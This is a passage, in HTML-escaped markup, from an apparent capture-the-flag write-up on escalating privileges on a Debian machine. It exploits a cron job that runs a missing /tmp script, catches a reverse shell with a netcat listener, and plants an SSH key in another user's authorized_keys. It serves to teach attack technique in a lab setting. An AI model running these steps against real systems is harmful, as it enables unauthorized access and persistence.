class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;txt&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;rw&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;r&lt;/span&gt;&lt;span class="o"&gt;--&lt;/span&gt;&lt;span class="n"&gt;r&lt;/span&gt;&lt;span class="o"&gt;--&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;root&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;root&lt;/span&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="mi"&gt;5&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;juin&lt;/span&gt;&lt;span class="w"&gt;   &lt;/span&gt;&lt;span class="mi"&gt;5&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;13&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;40&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;peda&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="k"&gt;session&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;overflow&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;txt&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;rw&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;r&lt;/span&gt;&lt;span class="o"&gt;--&lt;/span&gt;&lt;span class="n"&gt;r&lt;/span&gt;&lt;span class="o"&gt;--&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;hadi&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;hadi&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="mi"&gt;675&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;avril&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;26&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="mi"&gt;2017&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;profile&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;drwxr&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;xr&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;hadi&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;hadi&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;4&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="n"&gt;K&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;mai&lt;/span&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="mi"&gt;2017&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;ssh&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="n"&gt;SNIP&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Okay we got a program &lt;code&gt;buff&lt;/code&gt; owned by root and and file &lt;code&gt;buff.c&lt;/code&gt; readable by anybody but there is no suid, so no need to bother here.
&lt;code&gt;martin@debian:/home/hadi$ ls -laRh /etc/cron.d&lt;/code&gt; doesn't get us something useful but &lt;code&gt;cat /etc/crontab&lt;/code&gt; seems usable:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="n"&gt;martin&lt;/span&gt;&lt;span class="nv"&gt;@debian&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;home&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;hadi&lt;/span&gt;&lt;span class="err"&gt;$&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;cat&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;etc&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;crontab&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="n"&gt;SNIP&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;SHELL&lt;/span&gt;&lt;span class="o"&gt;=/&lt;/span&gt;&lt;span class="n"&gt;bin&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;sh&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="k"&gt;PATH&lt;/span&gt;&lt;span class="o"&gt;=/&lt;/span&gt;&lt;span class="n"&gt;usr&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="k"&gt;local&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="nl"&gt;sbin&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;usr&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="k"&gt;local&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="nl"&gt;bin&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="nl"&gt;sbin&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="nl"&gt;bin&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;usr&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="nl"&gt;sbin&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;usr&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;bin&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="err"&gt;#&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;m&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;h&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;dom&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;mon&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;dow&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;user&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="n"&gt;command&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="mi"&gt;17&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="w"&gt;   &lt;/span&gt;&lt;span class="n"&gt;root&lt;/span&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="n"&gt;cd&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;run&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;parts&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;--&lt;/span&gt;&lt;span class="n"&gt;report&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;etc&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;cron&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;hourly&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="mi"&gt;25&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;6&lt;/span&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="w"&gt;   &lt;/span&gt;&lt;span class="n"&gt;root&lt;/span&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="n"&gt;test&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;usr&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;sbin&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;anacron&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;||&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;cd&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;run&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;parts&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;--&lt;/span&gt;&lt;span class="n"&gt;report&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;etc&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;cron&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;daily&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="mi"&gt;47&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;6&lt;/span&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;7&lt;/span&gt;&lt;span class="w"&gt;   &lt;/span&gt;&lt;span class="n"&gt;root&lt;/span&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="n"&gt;test&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;usr&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;sbin&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;anacron&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;||&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;cd&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;run&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;parts&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;--&lt;/span&gt;&lt;span class="n"&gt;report&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;etc&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;cron&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;weekly&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="mi"&gt;52&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;6&lt;/span&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="w"&gt;   &lt;/span&gt;&lt;span class="n"&gt;root&lt;/span&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="n"&gt;test&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;usr&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;sbin&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;anacron&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;||&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;cd&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;run&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;parts&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;--&lt;/span&gt;&lt;span class="n"&gt;report&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;etc&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;cron&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;monthly&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="o"&gt;*/&lt;/span&gt;&lt;span class="mi"&gt;5&lt;/span&gt;&lt;span class="w"&gt;   &lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="w"&gt;   &lt;/span&gt;&lt;span class="n"&gt;jimmy&lt;/span&gt;&lt;span class="w"&gt;   &lt;/span&gt;&lt;span class="n"&gt;python&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;tmp&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;sekurity&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;py&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Of course the script launch by jimmy in &lt;code&gt;tmp&lt;/code&gt; doesn't exist. We create one with a simple python reverse shell &lt;a href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet"&gt;pentest monkey&lt;/a&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;root@kalili:~# nc -l -p 1234&lt;/span&gt;
&lt;span class="code-line"&gt;/bin/sh: 0: can&amp;#39;t access tty; job control turned off&lt;/span&gt;
&lt;span class="code-line"&gt;$ id&lt;/span&gt;
&lt;span class="code-line"&gt;uid=1002(jimmy) gid=1002(jimmy) groupes=1002(jimmy)&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We add our ssh key to be able to connect with ssh:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="nv"&gt;$&lt;/span&gt; &lt;span class="nv"&gt;cd&lt;/span&gt; &lt;span class="sr"&gt;/home/&lt;/span&gt;&lt;span class="n"&gt;jimmy&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="nv"&gt;$&lt;/span&gt; &lt;span class="nv"&gt;mkdir&lt;/span&gt; &lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;ssh&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="nv"&gt;$&lt;/span&gt; &lt;span class="nv"&gt;cat&lt;/span&gt; &lt;span class="sr"&gt;/home/m&lt;/span&gt;&lt;span class="n"&gt;artin&lt;/span&gt;&lt;span class="sr"&gt;/.ssh/&lt;/span&gt;&lt;span class="n"&gt;authorized_keys&lt;/span&gt; &lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;ssh&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;authorized_keys&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;There is binary &lt;code&gt;networker&lt;/code&gt; owned by root with an suid in our home directory (well jimmy's):&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="n"&gt;jimmy&lt;/span&gt;&lt;span class="nv"&gt;@debian&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt;&lt;span class="o"&gt;~&lt;/span&gt;&lt;span class="err"&gt;$&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;ls&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;al&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;total&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;36&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;drwx&lt;/span&gt;&lt;span class="o"&gt;------&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;3&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;jimmy&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;jimmy&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;4096&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;nov&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="mi"&gt;17&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;10&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;30&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;drwxr&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;xr&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;5&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;root&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="n"&gt;root&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="mi"&gt;4096&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;juin&lt;/span&gt;&lt;span class="w"&gt;   &lt;/span&gt;&lt;span class="mi"&gt;9&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;20&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;17&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;..&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;rw&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;r&lt;/span&gt;&lt;span class="o"&gt;--&lt;/span&gt;&lt;span class="n"&gt;r&lt;/span&gt;&lt;span class="o"&gt;--&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;root&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="n"&gt;root&lt;/span&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="mi"&gt;16&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;juin&lt;/span&gt;&lt;span class="w"&gt;   &lt;/span&gt;&lt;span class="mi"&gt;9&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;20&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;40&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;bash_history&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;rw&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;r&lt;/span&gt;&lt;span class="o"&gt;--&lt;/span&gt;&lt;span class="n"&gt;r&lt;/span&gt;&lt;span class="o"&gt;--&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;jimmy&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;jimmy&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="mi"&gt;220&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;juin&lt;/span&gt;&lt;span class="w"&gt;   &lt;/span&gt;&lt;span class="mi"&gt;8&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;21&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;07&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;bash_logout&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;rw&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;r&lt;/span&gt;&lt;span class="o"&gt;--&lt;/span&gt;&lt;span class="n"&gt;r&lt;/span&gt;&lt;span class="o"&gt;--&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;jimmy&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;jimmy&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;3515&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;juin&lt;/span&gt;&lt;span class="w"&gt;   &lt;/span&gt;&lt;span class="mi"&gt;8&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;21&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;07&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;bashrc&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
